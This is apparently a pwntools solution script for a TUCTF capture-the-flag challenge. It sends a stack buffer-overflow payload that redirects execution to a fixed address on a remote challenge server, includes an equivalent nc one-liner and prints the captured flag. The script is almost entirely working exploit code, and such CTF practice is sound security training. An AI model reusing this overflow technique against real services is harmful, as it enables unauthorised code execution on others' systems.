from pwn import *

context(log_level="debug")
# p = process('./pwn1')
p = remote('146.148.95.248',2525)
# p.recvuntil('d feed it.\n')
payload = 'a'*(0x20-0x14+12)+p32(0x804856D)
gdb.attach(p,'b*0x80485ED\nc')
p.sendline(payload)
# p.recvuntil('e flow?\n')
p.interactive()
#python -c "from pwn import *;print 'a'*(0x20-0x14+12)+p32(0x804856D)"|nc 146.148.95.248 2525

#TUCTF{jumping_all_around_dem_elfs}